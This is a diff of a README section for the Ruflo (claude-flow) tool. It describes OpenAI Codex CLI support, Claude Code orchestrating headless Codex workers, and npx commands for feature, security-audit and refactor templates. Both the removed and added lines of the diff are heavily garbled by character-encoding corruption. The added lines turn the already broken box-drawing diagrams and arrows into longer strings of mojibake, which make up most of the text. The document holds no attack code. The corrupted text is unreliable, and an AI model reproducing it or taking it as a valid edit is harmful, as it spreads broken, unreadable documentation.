+<summary>ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ <strong>OpenAI Codex CLI Support</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Full Codex integration with self-learning</summary>
 
 Ruflo supports both **Claude Code** and **OpenAI Codex CLI** via the [@claude-flow/codex](https://www.npmjs.com/package/@claude-flow/codex) package, following the [Agentics Foundation](https://agentics.org) standard.
 
@@ -607,10 +607,10 @@ npx ruflo@latest init --dual
 ### Key Concept: Execution Model
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š  CLAUDE-FLOW = ORCHESTRATOR (tracks state, stores memory)       Ã¢â€â€š
-Ã¢â€â€š  CODEX = EXECUTOR (writes code, runs commands, implements)      Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  CLAUDE-FLOW = ORCHESTRATOR (tracks state, stores memory)       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  CODEX = EXECUTOR (writes code, runs commands, implements)      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 **Codex does the work. Claude-flow coordinates and learns.**
@@ -620,13 +620,13 @@ npx ruflo@latest init --dual
 Run Claude Code for interactive development and spawn headless Codex workers for parallel background tasks:
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š  CLAUDE CODE (interactive)  Ã¢â€ ÂÃ¢â€ â€™  CODEX WORKERS (headless)        Ã¢â€â€š
-Ã¢â€â€š  - Main conversation         - Parallel background execution    Ã¢â€â€š
-Ã¢â€â€š  - Complex reasoning         - Bulk code generation            Ã¢â€â€š
-Ã¢â€â€š  - Architecture decisions    - Test execution                   Ã¢â€â€š
-Ã¢â€â€š  - Final integration         - File processing                  Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  CLAUDE CODE (interactive)  ÃƒÂ¢Ã¢â‚¬Â Ã‚ÂÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢  CODEX WORKERS (headless)        ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  - Main conversation         - Parallel background execution    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  - Complex reasoning         - Bulk code generation            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  - Architecture decisions    - Test execution                   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  - Final integration         - File processing                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ```bash
@@ -650,13 +650,13 @@ wait  # Wait for all to complete
 # List collaboration templates
 npx @claude-flow/codex dual templates
 
-# Run feature development swarm (architect Ã¢â€ â€™ coder Ã¢â€ â€™ tester Ã¢â€ â€™ reviewer)
+# Run feature development swarm (architect ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ coder ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ tester ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ reviewer)
 npx @claude-flow/codex dual run --template feature --task "Add user auth"
 
-# Run security audit swarm (scanner Ã¢â€ â€™ analyzer Ã¢â€ â€™ fixer)
+# Run security audit swarm (scanner ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ analyzer ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ fixer)
 npx @claude-flow/codex dual run --template security --task "src/auth/"
 
-# Run refactoring swarm (analyzer Ã¢â€ â€™ planner Ã¢â€ â€™ refactorer Ã¢â€ â€™ validator)
+# Run refactoring swarm (analyzer ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ planner ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ refactorer ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ validator)
 npx @claude-flow/codex dual run --template refactor --task "src/legacy/"
 ```
 
